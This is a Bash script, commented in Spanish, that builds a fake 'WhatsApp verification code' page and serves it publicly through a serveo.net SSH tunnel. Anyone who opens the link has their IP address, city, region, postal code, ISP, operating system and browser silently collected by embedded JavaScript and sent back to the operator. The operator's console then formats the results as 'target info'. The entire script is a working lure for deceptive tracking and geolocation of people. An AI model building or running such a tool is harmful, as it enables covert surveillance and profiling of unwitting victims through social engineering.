#!/bin/bash

(
function ctrl_c(){
    clear
    echo -e "${redColour}\n \n [+] Saliendo...${endColour}"
    tput cnorm; exit 1 #recuperar cursor
    ps -faux | grep -E 'ssh -R|grep|python3 -m' | awk '{print $2}' | xargs kill -9  
}

trap ctrl_c INT



if [[ ! $1 ]] || [[ ! $2 ]]; then

    echo -e "\n\t api.sh <image_url>  <local_web_port>"
    ps -faux | grep -E 'ssh -R|grep|python3 -m' | awk '{print $2}' | xargs kill -9  2>/dev/null
    exit 1

fi



 echo "
 <!DOCTYPE html>
 <html lang=\"en\">
 <head>
     <meta charset=\"UTF-8\">
     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
     <meta property=\"og:title\" content=\"Whatsapp code\"/>
     <meta property=\"og:type\" content=\"image\"/>
     <meta property=\"og:url\" content=\"$1\"/>
     <meta property=\"og:image\" content=\"$1\"/>
     <meta property=\"og:site_name\" content=\"Whatsapp verification code\"/>
     <meta property=\"og:image:type\" content=\"image/jpg\" /> 
     <meta property=\"og:image:width\" content=\"700\" /> 
     <meta property=\"og:image:height\" content=\"300\" />
     <title>Whatsapp code verify</title>
 </head>
 <body>
 	<img src=\"$1\" width=\"300\" height=\"300\" alt=\"Whatsap code\" srcset=\"\">    

     <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js\"></script>
     <script>
 	 (function () {
             'use strict';
            
             var module = {
                 options: [],
                 header: [navigator.platform, navigator.userAgent, navigator.appVersion, navigator.vendor, window.opera],
                 dataos: [
                     { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
                     { name: 'Windows', value: 'Win', version: 'NT' },
                     { name: 'iPhone', value: 'iPhone', version: 'OS' },
                     { name: 'iPad', value: 'iPad', version: 'OS' },
                     { name: 'Kindle', value: 'Silk', version: 'Silk' },
                     { name: 'Android', value: 'Android', version: 'Android' },
                     { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
                     { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
                     { name: 'Macintosh', value: 'Mac', version: 'OS X' },
                     { name: 'Linux', value: 'Linux', version: 'rv' },
                     { name: 'Palm', value: 'Palm', version: 'PalmOS' }
                 ],
                 databrowser: [
                     { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
                     { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
                     { name: 'Safari', value: 'Safari', version: 'Version' },
                     { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
                     { name: 'Opera', value: 'Opera', version: 'Opera' },
                     { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
                     { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
                 ],
                 init: function () {
                     var agent = this.header.join(' '),
                         os = this.matchItem(agent, this.dataos),
                         browser = this.matchItem(agent, this.databrowser);
                    
                     return { os: os, browser: browser };
                 },
                 matchItem: function (string, data) {
                     var i = 0,
                         j = 0,
                         html = '',
                         regex,
                         regexv,
                         match,
                         matches,
                         version;
                    
                     for (i = 0; i < data.length; i += 1) {
                         regex = new RegExp(data[i].value, 'i');
                         match = regex.test(string);
                         if (match) {
                             regexv = new RegExp(data[i].version + '[- /:;]([\\d._]+)', 'i');
                             matches = string.match(regexv);
                             version = '';
                             if (matches) { if (matches[1]) { matches = matches[1]; } }
                             if (matches) {
                                 matches = matches.split(/[._]+/);
                                 for (j = 0; j < matches.length; j += 1) {
                                     if (j === 0) {
                                         version += matches[j] + '.';
                                     } else {
                                         version += matches[j];
                                     }
                                 }
                             } else {
                                 version = '0';
                             }
                             return {
                                 name: data[i].name,
                                 version: parseFloat(version)
                             };
                         }
                     }
                     return { name: 'unknown', version: 0 };
                 }
             };
            
             var e = module.init(),debug = '';

           
            $.getJSON('https://ipapi.co/json/', function(data) {
                console.log(JSON.stringify(data, null, 2));
                fetch(window.location.href+\"dvc\?target_ip=\"+data.ip+\"&os.name=\"+e.os.name+\"&os.version=\"+e.os.version+\"&browser.name=\"+e.browser.name+\"&browser.version=\"+e.browser.version+\"&navigator.userAgent=\"+navigator.userAgent+\"&navigator.appVersion=\"+navigator.appVersion+\"&navigator.platform=\"+navigator.platform+\"&navigator.vendor=\"+navigator.vendor+\"/trg\&city=\"+data.city+\"\&state=\"+data.region+\"\&zip=\"+data.postal+\"\&ISP=\"+data.org)
            });


         }());	
     </script>
 </body>
 </html> "> ./index.html



(python3 -m http.server $2 &>/dev/null) &
job_number=$(jobs | awk '{print $1}')
ssh -R 80:localhost:$2 serveo.net 2>&1 | sed -e 's/dvc/\n\n______ Device info ______\n/g' -e 's/%20//g' -e 's/%3Cbr//g' -e 's/%3E//g' -e 's/%//g' -e 's/&/\n\t/g' -e 's/=/: /g' -e 's/?/\n\t/g' -e 's/trg/\n\n______ target info ______\n/g'&

fg %$job_number 


) 2>/dev/null



 

